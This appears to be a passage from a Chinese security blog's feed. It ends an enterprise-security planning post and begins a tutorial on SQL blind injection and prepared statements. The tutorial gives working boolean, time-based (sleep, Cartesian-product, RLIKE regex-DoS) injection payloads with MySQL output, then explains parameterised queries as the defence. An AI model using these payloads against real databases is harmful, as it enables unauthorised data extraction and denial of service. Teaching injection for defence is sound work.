title="办公网服务器安全"></a>办公网服务器安全</h4><p>事前安全措施：1、服务器基线检查；2、补丁检查；3、端口服务监控；4、服务器登录统一管理<br>事中安全措施：1、服务器进程监控；2、敏感账户登录监控；3、敏感命令执行监控；4、文件上传下载等（依赖主机安全产品，服务器上安装Agent）<br>事后安全措施：1、服务器木马；2、后门查杀；3、服务器安全加固（服务器应急响应）</p><h4 id="办公网终端PC安全"><a href="#办公网终端PC安全" class="headerlink" title="办公网终端PC安全"></a>办公网终端PC安全</h4><p>事前安全措施：1、防病毒；2、DLP；3、水印；4、行为监控<br>事中安全措施：1、DLP数据监控；2、水印监控</p><h3 id="办公网-应用安全建设"><a href="#办公网-应用安全建设" class="headerlink" title="办公网-应用安全建设"></a>办公网-应用安全建设</h3><h4 id="SSO统一登录入口"><a href="#SSO统一登录入口" class="headerlink" title="SSO统一登录入口"></a>SSO统一登录入口</h4><p>事前安全措施：1、内部所有的办公系统使用一套SSO认证系统，可有效管理员工账户密码，预防弱口令等风险<br>事中安全措施：1、异常登录监控；2、弱口令监控<br>事后安全措施：1、强制修改用户账号密码；2、加固SSO</p><h4 id="网站水印技术"><a href="#网站水印技术" class="headerlink" title="网站水印技术"></a>网站水印技术</h4><p>事前安全措施：1、对有重要敏感数据的网站加上水印，防止数据被截图泄露等风险<br>事中安全措施：1、水印攻防监控<br>事后安全措施：1、对涉事员工进行相应处罚</p><h4 id="邮箱安全"><a href="#邮箱安全" class="headerlink" title="邮箱安全"></a>邮箱安全</h4><p>事前安全措施：1、邮箱访问安全加固方案，用来解决邮箱接口被爆破风险；2、附件安全扫描；3、异地登录报警；4、弱口令扫描<br>事中安全措施：1、邮件爆破监控；2、账户或者IP封禁；3、异地登录监控<br>事后安全措施：1、若爆破成功，则强制修改相关员工密码，且排查安全风险</p><h4 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h4><p>事前安全措施：1、应用服务器上部署WAF，拦截web攻击<br>事中安全措施：2、WAF上进行攻击监测<br>事后安全措施：3、更新优化WAF拦截策略</p><h3 id="办公网-员工安全"><a href="#办公网-员工安全" class="headerlink" title="办公网-员工安全"></a>办公网-员工安全</h3><h4 id="在职员工安全教育"><a href="#在职员工安全教育" class="headerlink" title="在职员工安全教育"></a>在职员工安全教育</h4><p>事前安全措施：<br>1、定期对所有员工进行安全培训；<br>2、对新员工进行入职安全培训；<br>3、定期开展内部钓鱼测试；<br>4、针对RD可培训WEB安全开发；<br>5、针对OP可培训安全运维。<br>事中安全措施：1、对员工行为进行监控（可通过前面介绍的几种方案）；2、对钓鱼邮件进行告警<br>事后安全措施：1、对涉事员工进行相应处罚；2、钓鱼邮件影响评估</p><h4 id="离职员工安全审计"><a href="#离职员工安全审计" class="headerlink" title="离职员工安全审计"></a>离职员工安全审计</h4><p>1、离职行为审计；2、办公电脑审计；3、人员离职账户注销</p><h3 id="办公网-安全合规"><a href="#办公网-安全合规" class="headerlink" title="办公网-安全合规"></a>办公网-安全合规</h3><p>1、ISO27001；2、等保2.0</p><h3 id="生产网-系统安全建设"><a href="#生产网-系统安全建设" class="headerlink" title="生产网-系统安全建设"></a>生产网-系统安全建设</h3><ul><li>主机安全:1、内部资产发现；2、webshell监控；3、反弹shell监控等日常运营工作</li><li>日志分析监控：1、可以偏业务一些，比如接口防刷监控运维；2、也可以偏系统一些，攻击行为的监控运维</li><li>网络抗DDOS、应用抗CC：主要靠部署一些流量清洗产品</li><li>入侵检测、防御：IDS、IPS（对于告警记录的运维工作）</li><li>堡垒机：服务器统一登录管理，秘钥管理，访问控制策略运维工作</li><li>Router层统一映射管理：互联网端口、IP映射管理，结合cmdb平台运维工作</li><li>WAF：部署waf产品，拦截WEB攻击，告警记录运营工作</li><li>端口开放策略（ACL）</li><li>IPTABLES</li><li>态势感知（SOC平台）：流量监控平台，通过监控不同方向的流量，发现攻击行为</li><li>蜜罐（欺骗防御）：通过在内、外部部署蜜罐产品，发现攻击行为</li><li>邮件沙箱、网关：针对邮件钓鱼、恶意附件的检测</li><li>威胁情报：往往跟态势感知相结合</li></ul><p>除了系统层面的安全建设，生产网更多的是跟运维相关的一些安全内容（比如安全基线等），也包含项目上线的一些安全流程规范管理。</p><h3 id="外网边界安全建设"><a href="#外网边界安全建设" class="headerlink" title="外网边界安全建设"></a>外网边界安全建设</h3><ul><li>资产收集：IP、域名、URL、数据接口、端口服务监控，梳理统计内外网端口映射关系、业务线负责人等信息，盘点边界资产。</li><li>黑盒漏洞扫描：WEB漏洞扫描、主机漏洞扫描（可采购也可自研，定期巡检）</li><li>业务逻辑漏洞扫描：通过流量、日志被动式检测简单的业务逻辑漏洞</li><li>GITHUB监控：自动化监控github泄露的公司相关代码、服务器个人相关信息等</li><li>SRC上报漏洞响应：建设SRC平台，收集白帽子提交的安全漏洞</li><li>最新漏洞、0day响应：0day、1day漏洞的研究、应急团队，推动漏洞修复</li><li>威胁情报</li><li>渗透测试：定期开展从互联网边界实施的渗透测试工作，寻找安全漏洞</li></ul><p>外网边界的安全建设工作，大致分为三个步骤：资产盘点、漏洞扫描、漏洞推修（定期重复），0day漏洞应急另算。</p><h3 id="产品安全建设"><a href="#产品安全建设" class="headerlink" title="产品安全建设"></a>产品安全建设</h3><p>第一道防线：产品安全设计（早期可通过安全编码、意识培训使RD、PM具备信息安全意识）<br>第二道防线：需求评审、架构评审、代码审计、白盒扫描（通过建立需求安全评审等机制，严格控制新项目上线流程）<br>第三道防线：黑盒扫描、灰盒扫描（项目上线后可定期开展黑盒扫描）<br>第四道防线：SRC、企业蓝军（通过SRC、蓝军渗透发现的漏洞进行补充）<br>在整个产品安全建设过程中，企业可自研沉淀”产品安全开发库”、”SDL流程平台”以及制定”产品安全相关流程制度”。</p><h3 id="企业红蓝对抗"><a href="#企业红蓝对抗" class="headerlink" title="企业红蓝对抗"></a>企业红蓝对抗</h3><p>企业红军：负责企业安全建设、安全监控、安全加固<br>企业蓝军：负责攻击安全堡垒、找出安全薄弱点</p><p>网络安全红军的工作包含了以上所有的安全建设工作，而网络安全蓝军的工作是一个全新的视角，包含不限于：</p><p>内部钓鱼攻击<br>外部漏洞攻击<br>APT攻击<br>内部爆破攻击<br>员工信息收集<br>……<br>企业在蓝军团队建设过程中，可自研沉淀：漏洞扫描器、社工库、漏洞库等</p><h3 id="私有云安全"><a href="#私有云安全" class="headerlink" title="私有云安全"></a>私有云安全</h3><p>有些企业内部会建设私有云，关于私有云安全我接触不多，大致列一下所涉猎的内容：</p><p>网络安全：租户间的虚拟网络隔离、虚拟机与宿主机间的访问策略、同租户不同虚机间的访问策略等<br>数据安全：数据的备份加密、数据接口防重放、数据分级分类等<br>主机安全：防逃逸、内存溢出、入侵检测等<br>安全合规：等保2.0云安全相关章节</p><h3 id="私有云安全-1"><a href="#私有云安全-1" class="headerlink" title="私有云安全"></a>私有云安全</h3><p>有些企业内部会建设私有云，关于私有云安全我接触不多，大致列一下所涉猎的内容：</p><p>网络安全：租户间的虚拟网络隔离、虚拟机与宿主机间的访问策略、同租户不同虚机间的访问策略等<br>数据安全：数据的备份加密、数据接口防重放、数据分级分类等<br>主机安全：防逃逸、内存溢出、入侵检测等<br>安全合规：等保2.0云安全相关章节</p><h3 id="安全组织架构"><a href="#安全组织架构" class="headerlink" title="安全组织架构"></a>安全组织架构</h3><h4 id="小规模"><a href="#小规模" class="headerlink" title="小规模"></a>小规模</h4><p>若公司规模小，个人认为可按事前、事中、事后划分信息安全组织架构（仅供参考）</p><p>系统安全<br>事前团队：负责内外网安全建设<br>事中团队：负责入侵监控、异常监控<br>事后团队：负责应急响应、事后处罚整改<br>产品安全：SDL<br>安全合规<br>业务安全</p><h4 id="大规模"><a href="#大规模" class="headerlink" title="大规模"></a>大规模</h4><p>若公司规模大，可按安全区域划分组织架构（仅供参考）</p><p>系统安全：<br>办公网团队：负责办公网安全建设、安全监控、应急响应（内部可再按照前、中、后细分，再细分，可分WEB、移动、硬件等）<br>生产网团队：负责生产网安全建设、安全监控、应急响应<br>外网边界团队：负责边界安全建设、安全监控、应急响应<br>产品安全：SDL<br>安全合规<br>蓝军团队：如果规模小可不用设置蓝军团队。蓝军团队是脱离安全区域之外的，但属于事前。<br>业务安全<br>云安全</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>红队建设</p><ul><li><a href="https://github.com/aleenzz/Cobalt_Strike_wiki">Cobalt_Strike_wiki</a></li></ul><p>情报</p><ul><li><a href="http://wechat.doonsec.com/">http://wechat.doonsec.com/</a></li><li><a href="https://sec.thief.one/?type_id=a17165288561873d8fdf8e29586c891a">https://sec.thief.one/?type_id=a17165288561873d8fdf8e29586c891a</a></li></ul><p>漏洞预警</p><ul><li><a href="https://sec.thief.one/?type_id=dc31e48fe511b8ec10969ba13d282355">https://sec.thief.one/?type_id=dc31e48fe511b8ec10969ba13d282355</a></li></ul><h2 id="开源项目（待完善）"><a href="#开源项目（待完善）" class="headerlink" title="开源项目（待完善）"></a>开源项目（待完善）</h2><p><a href="http://wiki.beysec.com/">http://wiki.beysec.com/</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/0Uu_os9MB5ZHnowlWkYbEA">https://mp.weixin.qq.com/s/0Uu_os9MB5ZHnowlWkYbEA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4&quot;&gt;基本步骤&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%BD%91%E7%BB%9C%E7%B3%BB%E7%BB%9F%E5%A</summary>
      
    
    
    
    
    <category term="企业安全" scheme="https://yinwc.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>深入理解SQL盲注与SQL预编译</title>
    <link href="https://yinwc.github.io/2021/02/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E7%9B%B2%E6%B3%A8%E4%B8%8ESQL%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <id>https://yinwc.github.io/2021/02/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E7%9B%B2%E6%B3%A8%E4%B8%8ESQL%E9%A2%84%E7%BC%96%E8%AF%91/</id>
    <published>2021-02-02T09:45:08.000Z</published>
    <updated>2023-02-02T07:03:59.396Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#sql%E7%9B%B2%E6%B3%A8">SQL盲注</a><ul><li><a href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">布尔盲注</a></li><li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a></li></ul></li><li><a href="#sql%E9%A2%84%E7%BC%96%E8%AF%91">SQL预编译</a><ul><li><a href="#%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8sql%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E6%83%85%E5%86%B5">无法使用sql预编译的情况</a></li><li><a href="#%E5%8E%9F%E7%90%86%E5%8F%8A%E6%96%B9%E6%B3%95">原理及方法</a></li><li><a href="#mybatis%E9%A2%84%E7%BC%96%E8%AF%91">mybatis预编译</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>所谓的盲注就是猜测，通过寻找差异（包括运行时间的差异和页面返回结果的差异）来进行注入</p><p>也就是说我们想实现的是我们要构造一条语句来测试我们输入的布尔表达式，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注是最基础的一种注入，其本质是使SQL语句永真或永假，使<strong>页面上显示的内容不同</strong>，然后逐个字符的去判断，以此来得到数据库中的所有数据。<br>基于布尔的盲注是在这样的一种情况下使用：</p><ul><li>页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</li></ul><p><strong>常用函数：</strong><br><code>left</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">left(a,b)从左侧截取a的前b位</span><br><span class="line">substr</span><br><span class="line">substr(a,b,c)从b位置开始，截取字符串a的c长度。结合ascii()使用</span><br><span class="line">MID/ORD</span><br><span class="line">mid(a,b,c)同substr</span><br><span class="line">OPD()同ascii()</span><br></pre></td></tr></table></figure><p><code>regexp</code><br>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。<br>原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ul><li><p>regexp基本注入方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select (select语句) regexp &#x27;正则&#x27;</span><br><span class="line"># eg：</span><br><span class="line"># 正常查询：</span><br><span class="line">select username from users where id=1;</span><br><span class="line"># 正则注入，若匹配则返回1，不匹配返回0</span><br><span class="line">select (select username from users where id=1) regexp &#x27;^a&#x27;;</span><br><span class="line">^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0</span><br></pre></td></tr></table></figure></li></ul><p>regexp关键字还可以代替where条件里的&#x3D;号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where password regexp &#x27;^ad&#x27;;</span><br></pre></td></tr></table></figure><p>常用regexp正则语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#x27;^r&#x27;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中</span><br></pre></td></tr></table></figure><p>在联合查询中的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database() regexp &#x27;^s&#x27;,3--+</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">## 普通查询</span><br><span class="line"></span><br><span class="line">mysql&gt; select 123 from test where 1=1;</span><br><span class="line">+-----+</span><br><span class="line">| 123 |</span><br><span class="line">+-----+</span><br><span class="line">| 123 |</span><br><span class="line">+-----+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 123 from test where 1=0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 ^</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1^0;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 &amp;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1 &amp; 1;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 1 &amp; 0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 |</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 0 | 1;</span><br><span class="line">+----+--------+----------+</span><br><span class="line">| id | name   | password |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">|  1 | v1zkra | 123456   |</span><br><span class="line">+----+--------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where id = 0 | 0;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 使用 ~</span><br><span class="line"></span><br><span class="line">使用情况：当系统不允许输入大的数字的时候，可能是限制了字符的长度，限制了不能使用科学计数法，但是我们还是想让其报错，我们就能采取这种方式</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~1 ;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~1                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551614 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select bin(~1);</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| bin(~1)                                                          |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| 1111111111111111111111111111111111111111111111111111111111111110 |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.32 sec)</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>基于时间的盲注的一般思路是延迟注入，说白了就是将判断条件结合延迟函数注入进入，然后根据语句执行时间的长短来确定判断语句返回的 TRUE 还是 FALSE，从而去猜解一些未知的字段(整个猜解过程其实就是一种 fuzz)。</p><p>常用函数：</p><ul><li>1、MySQL的sleep和benchmark</li></ul><p><strong>sleep()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=0,1, sleep(10)) --+  # 注释符用于闭合语句，使语句正常执行</span><br></pre></td></tr></table></figure><p>IF表达式：<br>IF(expr1,expr2,expr3) ：如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p><p><strong>benchmark(count,expr)</strong><br>BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select username from users where id=1) regexp &#x27;^a&#x27;;</span><br></pre></td></tr></table></figure><ul><li>2、Heavy Query 笛卡尔积</li></ul><p>将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure><ul><li><p>3.Get_lock() 加锁机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_lock(key,timeout) 一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)。</span><br><span class="line">如果key是第一次加锁返回1，反之等待时间进行第二次加锁。</span><br></pre></td></tr></table></figure><p>利用条件比较苛刻，需要使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_pconnect</span><br></pre></td></tr></table></figure><p>函数来连接数据库</p></li></ul><p>如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p><p>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入</p><ul><li>4、RLIKE注入</li></ul><p>正则DOS，和benchmark相似，利用SQL多次计算正则消耗计算资源产生延时效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;s&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure><h2 id="SQL预编译"><a href="#SQL预编译" class="headerlink" title="SQL预编译"></a>SQL预编译</h2><h3 id="无法使用sql预编译的情况"><a href="#无法使用sql预编译的情况" class="headerlink" title="无法使用sql预编译的情况"></a>无法使用sql预编译的情况</h3><p>1、对于关键词order by来说，如果使用预编译处理，参数绑定为String类型，order by 的参数会被单引号包裹，导致无法排序 &#x2F;&#x2F; 还有like<br>2、对于拼接列名、表名的sql语句来说，参数绑定后也会用单引号包裹，故也无法使用预编译处理<br>3、在prepare绑定参数阶段也能够报错注入<br>4、某些数据库不支持预编译(如sqllite与低版本mysql)，可以使用<a href="https://xz.aliyun.com/t/7132#toc-0">模拟预编译</a></p><p><a href="https://xz.aliyun.com/t/7132#toc-0">Sql预编译于模拟预编译研究</a></p><h3 id="原理及方法"><a href="#原理及方法" class="headerlink" title="原理及方法"></a>原理及方法</h3><p>以mysql数据库为例：通常情况下，在数据库接收到一条普通的SQL语句后，<br>首先对其进行语义解析，随后对此条SQL语句进行优化并制定执行计划并执行；<br>当采用预编译操作时，首先将待执行的SQL语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>经过预编译操作之后，无论后续向模板传入什么参数，这些参数仅仅被当成字符串进行查询处理，因此杜绝了sql注入的产生</p><p>使用预编译四步走：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1：定义预编译的sql语句，其中待填入的参数用 `?` 占位。注意，?无关类型，不需要加分号之类。其具体数据类型在下面setXX（）时决定。</span><br><span class="line"></span><br><span class="line">2：创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。</span><br><span class="line"></span><br><span class="line">3：填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。注意：问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）.</span><br><span class="line"></span><br><span class="line">4：执行预处理对象。主要有</span><br><span class="line">boolean execute() 在此 PreparedStatement 对象中执行 SQL 语句，该语句可以是任何种类的 SQL 语句</span><br><span class="line">ResultSet   executeQuery() 在此 PreparedStatement 对象中执行 SQL 查询，并返回该查询生成的 ResultSet 对象</span><br><span class="line">int    executeUpdate() 在此 PreparedStatement 对象中执行 SQL 语句，该语句必须是一个 SQL 数据操作语言（Data Manipulation Language，DML）语句，比如 INSERT、UPDATE 或 DELETE 语句；或者是无返回内容的 SQL 语句，比如 DDL 语句。</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String username = &quot;ye&quot;;</span><br><span class="line">String password = &quot;ye&quot;;</span><br><span class="line">String sql = &quot;select * from user where username = ? and password = ?;&quot;;</span><br><span class="line"></span><br><span class="line">db.stmt = db.conn.prepareStatement(sql);</span><br><span class="line">db.stmt.setString(1, username);</span><br><span class="line">db.stmt.setString(2, password);</span><br><span class="line">ResultSet rs = db.stmt.executeQuery();</span><br></pre></td></tr></table></figure><h3 id="mybatis预编译"><a href="#mybatis预编译" class="headerlink" title="mybatis预编译"></a>mybatis预编译</h3><p>mybatis 中使用 sqlMap 进行 sql 查询时，经常需要动态传递参数,使用<code>#&#123; &#125;</code>和 <code>$&#123; &#125;</code>来进行动态传参</p><figure class="highlight plaintext"><table><tr><td 